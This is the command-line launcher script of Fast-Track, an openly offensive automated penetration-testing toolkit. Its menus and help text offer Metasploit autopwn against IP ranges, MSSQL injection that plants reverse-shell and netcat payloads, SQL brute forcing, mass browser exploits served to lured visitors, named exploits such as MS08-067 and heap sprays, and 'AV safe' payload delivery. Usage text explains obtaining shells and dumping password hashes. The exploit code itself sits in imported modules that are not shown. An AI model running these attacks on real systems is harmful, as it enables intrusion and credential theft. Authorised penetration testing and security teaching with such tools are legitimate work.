#!/usr/bin/env python
###########################################################################
#                                                                         #
# Fast-Track - A new beginning...                                         #
#                                                                         #
# Created by: David Kennedy (ReL1K)                                       #
# Developer: Joey Furr (j0fer)                                            #
#                                                                         #
# Can find us on IRC:                                                     #
# irc.freenode.net #social-engineer                                       #
#                                                                         #
# DISCLAIMER: This is only for testing purposes and can only be           # 
# used where strict consent has been given. Do not use this for           #
# illegal purposes period. The creators of this tool hold no              #
# responsibility for any misuse or abuse of this tool.                    #
#                                                                         #
# Please read the LICENSE file under readme for licensing agreements. By  #
# using Fast-Track in any purpose you agree to these licensing agreements #
#                                                                         #
###########################################################################
import sys,os,time,subprocess                                             #
###########################################################################


if os.geteuid() != 0:  # Check if we're root
   print "\nFast-Track v4 - A new beginning...\n\n"
   print "Fast-Track is not running under root. Please re-run the tool under root...\n"
   sys.exit(1)
   
readversion=file("bin/version/version","r")
for line in readversion:
   version=line.rstrip()
definepath=os.getcwd()
mainusage="""\n----------------------------------------------------------------\n\nFast-Track - A new beginning...\n\nAutomated Penetration Testing\n\nWritten by David Kennedy (ReL1K)\n\nPlease read the README and LICENSE before using\nthis tool for acceptable use and modifications.\n\n----------------------------------------------------------------\nModes:\n\nInteractive Menu Driven Mode: -i\nCommand Line Mode: -c\nWeb GUI Mode -g\n\nExamples: ./fast-track.py -i\n          ./fast-track.py -c\n          ./fast-track.py -g\n          ./fast-track.py -g <portnum>\n\nUsage: ./fast-track.py <mode>\n"""

remold=subprocess.Popen("rm -rf bin/appdata/* 2> /dev/null", shell=True).wait()  # If less than two, print base message
if len(sys.argv) < 2:
   print mainusage
else:
   try:
      var1=sys.argv[1]       #Assign variables to sys.arg
      var2=sys.argv[2]
      var3=sys.argv[3]
      var4=sys.argv[4]
      var5=sys.argv[5]
      var6=sys.argv[6]
      var7=sys.argv[7]
   except IndexError:        # Used incase sys.arg isn't specified
      pass
   
   if sys.argv[1] == '-i':   # -i for menu mode
      definepath=os.getcwd()
      sys.path.append("%s/bin/menu/" % (definepath))
      try:
         reload(main)        # import the main menu
      except Exception:pass
      import main
   else:
      print mainusage        # Print MainUsage if invalid syntax
   # Start GUI
   if sys.argv[1] == '-g':
      definepath=os.getcwd()
      sys.path.append("%s/bin/web/" % (definepath))
      try:
         import ftgui
      except Exception, e: 
         print e
         print "Address already in use.."
   
   # -c for command line
   if sys.argv[1] == '-c':
      # define where commandmenu mode modules are
      definepath=os.getcwd()
      sys.path.append("%s/bin/ftsrc/" % (definepath))
      # Show command line menu
      print """
************************************************************************
Fast-Track Command Line - A new beginning...
************************************************************************
      
**** MAKE SURE YOU INSTALL ALL THE DEPENDENCIES FIRST  (setup.py) ****
      
Visit http://www.secmaniac.com for tutorials or to file a bug.
1.  Update Fast-Track
2.  Autopwn Automated
3.  MS-SQL Injector
4.  MS-SQL Bruter
5.  Binary to Hex Payload Generator
6.  Mass Client-Side Attack
7.  Exploits
8.  SQLPwnage
9.  Payload Generator
10. Changelog
11. Credits
12. About
      
Usage: fast-track.py -c <tool#>
"""
      try:
         if var2 == '1':
               import updateft
         ### END Update Everything
         ### START Metasploit Autopwn Feature ###
         if var2 == '2':
           print """
Metasploit Autopwn Automated

Metasploit's Autopwn Function can require some knowledge in order
to set it up. Fast-Track tries to simplify that.

Simply type ./fast-track -c 2 <ipaddr or range> <-r or -b> (reverse or bind) to launch the exploits.

Usage: ./fast-track.py -c 2 <iprange> <-r or -b> <--reverse or bind

Examples: ./fast-track.py -c 2 192.168.1.1-254 -b
          ./fast-track.py -c 2 "-PN 192.168.1.1-254" -r
          ./fast-track.py -c 2 "-T 1 192.168.1.1/24" -r\n\n
"""
           if var3:
               import autopwn
         ### END Metasploit Autopwn Feature ###  
         ### START SA SQL Injector ###
         if var2 == '3':
            print """\nMSSQL Root SQL Injector\n\nOptions:\n\n1. Binary Payload Injection GET\n2. Reverse FTP NetCat Payload GET\n3. Manual Setup GET\n4. Binary Payload Injection POST\n\nUsage: ./fast-track.py -c 3 <option>\n"""
            if var3 == '1':
               print """\nBinary Payload Injection\n\nRemember to symbolize injectable parameter with 'INJECTHERE\n\nExamples: ./fast-track.py -c 3 1 "www.blah.com/moo.aspx?id='INJECTHERE&password=blah"\n          ./fast-track.py -c 3 1 "www.blah.com/moo.aspx?param='INJECTHERE"\n\nUsage: ./fast-track.py -c 3 1 "<injectableurl>"\n"""
               if var4:
                  import sqlbinarypayload
            if var3 == '2':
               print """\nNetCat Reverse FTP Payload\n\nExamples: ./fast-track.py -c 3 2 "www.blah.com/moo.aspx?id='INJECTHERE&password=blah"\n          ./fast-track.py -c 3 2 "www.blah.com/moo.aspx?param='INJECTHERE"\n\nUsage: ./fast-track.py -c 3 2 "<injectableurl>"\n\n"""
               if var4:
                  import sqlftppayload
            if var3 == '3':
               print """\nManual SQL Injector\n\nExample: ./fast-track.py -c 3 3 "www.blah.com/moo.aspx?id='INJECTHERE" 192.168.1.54 4444\n\n<injectableurl" = website your attacking, symbolize 'INJECTHERE for vuln. parameter\n<netcatlistener> = IP Address you have netcat listening on\n<port number> = Port number you have NetCat listening on\n\nUsage: ./fast-track.py -c 3 3 "<injectableurl>" <netcatlistener> <port number>\n""" 
               if var4:
                  import sqlmanual
            if var3 == '4':
               print """\nBinary Payload Injection POST\n\nExample: ./fast-track.py -c 3 4 "http://www.blah.com/moo.aspx"\n\nUsage: ./fast-track.py -c 3 4 "<injectableurl>"\n""" 
               if var4:
                  import sqlbinarypayloadpost
         ### END SA SQL Injector ###
         ### START SQL Bruter ###
         if var2 == '4':
            print """\nSQL Bruter Port 1433\n\nModes:\n\n1. Quick Brute Force\n2. Mass Wordlist Brute Force\n3. Single Wordlist Brute Force\n"""
            if var3 == '1':
               print """\nSQL Quick Brute Force\n\nExamples: ./fast-track.py -c 4 1 192.168.1.1-254 sa\n          ./fast-track.py -c 4 1 192.168.1.1 sa\n\nUsage: ./fast-track.py -c 4 1 <iprange> <useraccount>\n"""
               if var5:
                  import sqlbrutequick
            if var3 == '2':
               print """\nMass Wordlist Bruter\n\nNOTE: There is a decent dictionary wordlist located in bin/dict/wordlist.txt\n\nExamples: ./fast-track.py -c 4 2 192.168.1.1-254 sa /root/wordlist.txt\n          ./fast-track.py -c 4 2 192.168.1.1/24 sa /wordlist.txt\n\nUsage: ./fast-track.py -c 4 2 <iprange> <username> <wordlist>\n"""
               if var5:
                  import sqlbruteword
            if var3 == '3':
               print """\nSingle IP Wordlist Brute Force\n\nNOTE: There is a decent dictionary file located in bin/dict/wordlist.txt\n\nExamples: ./fast-track.py -c 4 3 192.168.1.5 sa /wordlist.txt\n          ./fast-track.py -c 4 3 192.168.1.5 sa /blah/wordlist.txt\n\nUsage: ./fast-track.py -c 4 3 <ipaddy> <username> <wordlist>\n"""
               if var5:
                  import sqlbruteword
         ### END SQL Bruter ###
         ### START Binary to Hex Generator ###
         if var2 == '5':
            print """\nBinary to Hex Generator\n\nExamples: ./fast-track.py -c 5 file.exe\n          ./fast-track.py -c 5 /pentest/nc.exe\n\nUsage: ./fast-track.py -c 5 <executable to convert>\n"""
            if var3:
               import binarypayloadgen
         ### END Binary to Hex Generator ###
         ### START Fast-Track Client Side Attack ###
         if var2 == '6':
            print """\nFast-Track Mass Client-Side Attack\n\nRequirements: PExpect\n\nMetasploit has a bunch of powerful client-side attacks available in\nits arsenal. This simply launches all client side attacks within\nMetasploit through msfconsole and starts them on ports ranging\nfrom 8000 and up and creates a custom http server for you using the BaseHTTPServer module in python, injects a new index.html\nfile, and puts all of the exploits in iframes. \n\nIf you can get someone to connect to this web page, it will basically \nbrute force various client side exploits in the hope one succeeds. \nYou'll have to monitor each shell if one succeeds.. Once finished,\njust have someone connect to port 80 for you and if they are vulnerable\nto any of the exploits...should have a nice shell or a meterpreter.\n\nRemember once a shell is successful to sessions -l and sessions -i <id>\nto interact with the shell/meterpreter.\n\nAlso remember to learn meterpreter commands, some examples:\n\nexecute -f cmd.exe -i (gives you a shell)\n\nor\n\nuse priv\nhashdump (dumps the SAM for ya)\n\nPayloads:\n\n1. Meterpreter Reverse TCP Shell\n2. Generic Bind Shell\n3. Meterpreter Reverse VNC Inject (GUI)\n4. Reverse TCP Shell\n\nAlso, I added an ettercap option, if you have ettercap installed then specify a\n1 flag at the end of the usage to use ettercap and poison a specific victim.\n\nExamples: ./fast-track.py -c 6 127.0.0.1 1 1\n          ./fast-track.py -c 6 192.168.1.34 2 1\n\nUsage: ./fast-track.py -c 6 <ipaddr> (your main ip addy, i.e. eth0) <payload> <1 for ettercap, else dont specify>\n"""
            if var3:
               sys.path.append("%s/bin/ftsrc/clientattack/" % (definepath))
               import massclient
         ### END Fast-Track Client Side Attack ###

         ### START Exploits Menu ###
         if var2 == '7':
            print """\nExploits Menu\n\nExploit List:\n\n1. HP Openview Network Node Manager CGI Buffer Overflow\n2. IBM Tivoli Storage Manager Express CAD Service Buffer Overflow\n3. HP Openview NNM 7.5.1 OVAS.EXE Pre Authentication SEH Overflow\n4. Quicktime RTSP 7.3 SEH Overflow\n5. Goodtech 6.4 Buffer Overflow\n6. MS08-067: MS Windows Server Service Code Execution\n7. mIRC 6.34 Remote Buffer Overflow Exploit\n8. TFTP Server for Windows V1.4 ST\n9. Microsoft Internet Explorer XML Corruption Heap Spray\n10. MS09-002 Internet Explorer Memory Corruption Exploit\n11. MS Internet Explorer 7 DirectShow (msvidctl.dll) Heap Spray\n12. FireFox 3.5 Heap Spray Exploit\n\nExamples ./fast-track.py -c 7 1\n\nUsage: ./fast-track.py -c 7 <exploitnum>\n\n"""
            if var3 == '1':
               print """HP Openview Network Node Manager CGI Buffer Overflow\n\nCoded by Mati Aharoni\nhttp://www.zerodayinitiative.com/advisories/ZDI-07-071.html\nTested on NNM Release B.07.50 / Windows 2000 server SP4\nmuts@offensive-security.com\n\nExploit instructions: Simply enter target IP. Let Fast-Track do the rest\nfor you.\n\nExample Usage: ./fast-track.py 8 1 192.168.1.3\n\nUsage: ./fast-track.py 8 1 <ipaddr>\n"""
               if var4:
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import hpopenview
            if var3 == '2':
               print """IBM Tivoli Storage Manager Express CAD Service Buffer Overflow\n\n[*] http://www.offensive-security.com"\n[*] Coded by Mati Aharoni\n\nExample: ./fast-track.py -c 7 2 192.168.3.5\n\nUsage: ./fast-track.py -c 7 2 <ipaddr>\n"""
               if var4:
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import ibmcad
            if var3 == '3':
               print """HP Openview NNM 7.5.1 OVAS.EXE Pre Authentication SEH Overflow\n\nTested on Windows 2003 Server SP1.\nCoded by Mati Aharoni\nmuts..at..offensive-security.com\nhttp://www.offensive-security.com/0day/hp-nnm-ov.py.txt\n[shameless plug]\nThis vulnerability was found, analysed and exploited\nas part of a training module in "BackTrack to the Max".\nhttp://www.offensive-security.com/ilt.php\n[/shameless plug]\n\nExample: ./fast-track.py -c 7 3 192.168.1.31\n\nUsage: ./fast-track.py -c 7 3 <ipaddr>\n"""
               if var4:
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import hpopenviewnnm
            # import quicktime exploit
            if var3 == '4': 
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import quicktime
            # import goodtech exploit
            if var3 == '5':
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import goodtech
            if var3 == '6':
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import ms08067run
            if var3 == '7':
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import mirc
            if var3 == '8':
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import tftp
            if var3 == '9':
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import xmlcorruptionbo
            if var3 == '10':
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import ms09002
            if var3 == '11':
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import ie0day_activex
            if var3 == '12':
                  sys.path.append("%s/bin/exploits/" % (definepath))
                  import firefox35

         ### END Exploits Menu ###



         ### START SQLPWNAGE Menu ###
         if var2 == '8':
            print """\nSQLPwnage Menu\n\nSQLPwnage is the swiss army knife of MSSQL Injection and incorporates\nadvanced and unseen methods in attacking systems.\n
----------------------------------------------------------------
-  							       -	
-						  	       -
- This module has the following two options:                   -  
-                                          		       - 
- 1)  Spider a single URL attempting blind/error based sql     -
- injection  exploitation                                      -
-                                                              - 
- 2)  Scan an entire subnet looking for webservers running on  -
-     port 80.  The user will then be prompted with two        -
-     choices: 1) Select a website or, 2) Attempt to spider    -
-     all websites that was found during the scan attempting   -
-     to identify possible SQL Injection.  This module will    -
-     attempt blind and error SQL injection on every form      -
-     parameter                                                -
-     that is identified                                       -
-                                                              -
-                                                              -
-      If all goes well a payload will be returned back to     -
-      the user.                                               -
---------------------------------------------------------------- 

Features:

Custom built 64kb debug payload bypass: Bypasses the 64kb restriction in debug by dropping
our tiny payload through the debug method and then using that payload to convert hex to raw
binary.

Advanced Payload Delivery: Delivers custom packed AV safe payloads made specifically for
Fast-Track. Can deliver Metasploit VNC Inject Reverse TCP payloads, and Meterpreter payloads.
This is all done without egress connections for payload delivery.

Auto Crawl: Crawl an entire site looking at every parameter and injecting looking for SQL
Injection.

Mass Scan: Scan subnets looking for web servers, auto crawl, and autopwn them.

SQL Injection: Auto SQL Injection Blind and Error Based

1. MSSQL Injection Search and Destroy Binary Payload Injection (BLIND)
2. MSSQL Injection Search and Destroy Binary Payload Injection (ERROR BASED)
3. MSSQL Injection Single URL Binary Payload Injection

\nUsage: ./fast-track.py -c 8 <attack>\n"""

            if var3 == '1':
               print """\nSQLPwnage Crawler and Attack with Blind SQL Injection\n\n1. Scan URL\n2. Scan an entire subnet for web servers\n3. List the last subnet scanned\n\nUsage: ./fast-track.py -c 8 1 <num>\n """
               if var4 == '1':
                  print """\nSQLPwnage Crawler and Attack with Blind SQL Injection\n\nThere are a few options you must specify in order to run\nSQLPwnage Blind SQL Injection.\n\nFirst, select the site you want to attack i.e. 192.168.1.23\n\nSecond, select the payload you want to deliver, here are the options:\n\n1. Reverse TCP Shell (AV Safe)\n2. Meteasploit Reverse TCP VNC Inject (Requires Metasploit)\n3. Metasploit Meterpreter Reverse TCP (Requires Metasploit)\n4. Metasploit Generic Bind Shell\n\nLastly, enter the port number you want to connect back from.\nExample: ./fast-track.py -c 8 1 1 192.168.1.23 2 4444\nUsage: ./fast-track.py -c 8 1 1 <ipaddr to attack> <payload> <reverseportnum>\n\n"""
                  if var5:
                     sys.path.append("%s/bin/ftsrc/sqlpwnage/" % (definepath))
                     import sqlpwnage

               if var4 == '2':
                  print """\nSQLPwnage Crawler and Attack Subnet Scanner with Blind SQL Injection\n\nSQLPwnage Crawler and Attack Subnet Scanner with Blind SQL Injection will\ncrawl a range of IP addresses looking for web servers. Once identified, you\ncan either attack all of the websites, or all of them.\n\nSimply enter the subnet range you want to pwn\n\nUsage: ./fast-track.py -c 8 1 2 192.168.1.1-254\n\n"""
                  if var5:
                     sys.path.append("%s/bin/ftsrc/sqlpwnage/" % (definepath))
                     import sqlpwnage

               if var4 == '3':
                     sys.path.append("%s/bin/ftsrc/sqlpwnage/" % (definepath))
                     import sqlpwnage

            if var3 == '2':
               print """\nSQLPwnage Crawler and Attack with Error Based SQL Injection\n\n1. Scan URL\n2. Scan an entire subnet for web servers\n3. List the last subnet scanned\n\nUsage: ./fast-track.py -c 8 2 <num>\n\n"""
               if var4 == '1':
                  print """\n\nSQLPwnage Search and Destroy Carnage Error Based SQL Injection\n\nThere are a few options you must specify in order to run\nSQLPwnage Error Based SQL Injection.\n\nFirst, select the site you want to attack i.e. 192.168.1.23\n\nSecond, select the payload you want to deliver, here are the options:\n\n1. Reverse TCP Shell (AV Safe)\n2. Meteasploit Reverse TCP VNC Inject (Requires Metasploit)\n3. Metasploit Meterpreter Reverse TCP (Requires Metasploit)\n4. Windows TCP Bind Shell (Requires Metasploit)\n\nLastly, enter the port number you want to connect back from.\n\nExample: ./fast-track.py -c 8 2 1 192.168.1.23 2 4444\nUsage: ./fast-track.py -c 8 1 1 <ipaddr to attack> <payload> <reverseportnum>\n\n"""
                  if var5:
                     sys.path.append("%s/bin/ftsrc/sqlpwnage/" % (definepath))
                     import sqlpwnage
               if var4 == '2':
                  print """

SQLPwnage Crawler and Attack Subnet Scanner with Error Based SQL Injection\n\n

SQLPwnage Crawler and Attack Subnet Scanner with Error Based SQL Injection will\n
crawl a range of IP addresses looking for web servers. Once identified, you\n
can either attack all of the websites, or all of them.

\n\nUsage: ./fast-track.py -c 8 2 2 192.168.1.1-254\n\n"""
                  if var5:
                     sys.path.append("%s/bin/ftsrc/sqlpwnage/" % (definepath))
                     import sqlpwnage
               if var4 == '3':
                     sys.path.append("%s/bin/ftsrc/sqlpwnage/" % (definepath))
                     import sqlpwnage

            if var3 == '3':
               print """
\nSQLPwnage Crawler and Attack Single URL Attack\n\n

Attacks a single page for SQL Injection. 

Simply specify the URL.

Usage: ./fast-track.py -c 8 3 <websiteurl>\n """
               if var4:
                     sys.path.append("%s/bin/ftsrc/sqlpwnage/" % (definepath))
                     import sqlpwnage

         ### END SQLPWNAGE Menu ###

         # START ABOUT MENU
         if var2 == '9':
            sys.path.append("%s/bin/ftsrc/" % (definepath))
            import payloadgen
         # END ABOUT MENU

         # START CHANGELOG MENU
         if var2 == '10':
            sys.path.append("%s/bin/ftsrc/" % (definepath))
            import changelog
         # END CHANGELOG MENU

         # START CREDITS MENU
         if var2 == '11':
            sys.path.append("%s/bin/ftsrc/" % (definepath))
            import credits
         # END CREDITS MENU

         # START ABOUT MENU
         if var2 == '12':
            sys.path.append("%s/bin/ftsrc/" % (definepath))
            import about
         # END ABOUT MENU

      # Generic error catch pass is to display nothing
      except KeyboardInterrupt:
         print '\nExiting Fast-Track....\n' 
         # Remove old files
         cleanup=subprocess.Popen("rm sqlpassword 2> /dev/null;rm SqlScan.txt 2> /dev/null;rm sqlopen.txt 2> /dev/null;rm pentest 2> /dev/null;rm parse2.txt 2> /dev/null;rm parse.txt 2> /dev/null;rm portscan.txt 2> /dev/null;rm bin/appdata/*comp 2> /dev/null;rm bin/appdata/sqlsuccesslist.txt 2> /dev/null;killall ruby 2> /dev/null", shell=True)
         sys.exit()
      except IndexError:
         pass 
      except NameError:
         pass
      except Exception, e:
         print "\nSomething went wrong...Printing error: "+str(e)+"\n"
         # Remove old files
         cleanup=subprocess.Popen("rm sqlpassword 2> /dev/null;rm SqlScan.txt 2> /dev/null;rm sqlopen.txt 2> /dev/null;rm pentest 2> /dev/null;rm parse2.txt 2> /dev/null;rm parse.txt 2> /dev/null;rm portscan.txt 2> /dev/null", shell=True)
cleanup=subprocess.Popen("rm sqlpassword 2> /dev/null;rm SqlScan.txt 2> /dev/null;rm sqlopen.txt 2> /dev/null;rm pentest 2> /dev/null;rm parse2.txt 2> /dev/null;rm parse.txt 2> /dev/null 2> /dev/null;rm portscan.txt 2> /dev/null;killall ruby 2> /dev/null;rm metasploitloadfile 2> /dev/null", shell=True) 
